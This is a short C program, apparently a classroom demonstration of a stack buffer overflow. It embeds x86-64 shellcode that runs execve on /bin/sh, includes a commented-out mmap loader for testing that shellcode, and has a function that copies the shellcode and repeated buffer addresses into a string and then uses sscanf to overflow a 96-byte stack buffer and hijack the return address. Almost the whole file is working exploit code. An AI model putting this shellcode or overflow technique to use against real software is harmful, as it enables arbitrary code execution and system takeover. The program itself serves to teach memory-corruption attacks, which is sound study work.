#include <stdio.h> 
#include <sys/mman.h> 
#include <string.h> 
#include <stdlib.h>
 
int (*sc)();
	 
char shellcode[] = "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53" "\x54\x5f\x52\x57\x54\x5e\x0f\x05";

/*int main(int argc, char **argv) {*/
 
    /*void *ptr = mmap(0, 24,*/
            /*PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON*/
            /*| MAP_PRIVATE, -1, 0);*/
 
    /*if (ptr == MAP_FAILED) {*/
        /*perror("mmap");*/
        /*exit(-1);*/
    /*}*/
 
    /*memcpy(ptr, shellcode, sizeof(shellcode));*/
    /*sc = ptr;*/
 
    /*sc();*/
 
    /*return 0;*/
/*}*/

char large_string[128];

void foo()
{
    char buffer[96];
    int i;
    long *long_ptr = (long *) large_string;


    printf("This program tries to use scanf() to overflow the buffer.\n");
    printf("If you get a /bin/sh prompt, then the exploit has worked.\n");
    printf("Press any key to continue...");
    getchar();

    for (i = 0; i < 32; i++)
	*(long_ptr + i) = (int) buffer;
    for (i = 0; i < (int) strlen(shellcode); i++)
	large_string[i] = shellcode[i];

    sscanf(large_string, "%s", buffer);

    return;
}

int main(int ac, char *av[])
{
    foo();

    printf("If you see this statement, it means that the buffer\n");
    printf("overflow never occurred.\n");

    return 0;
}
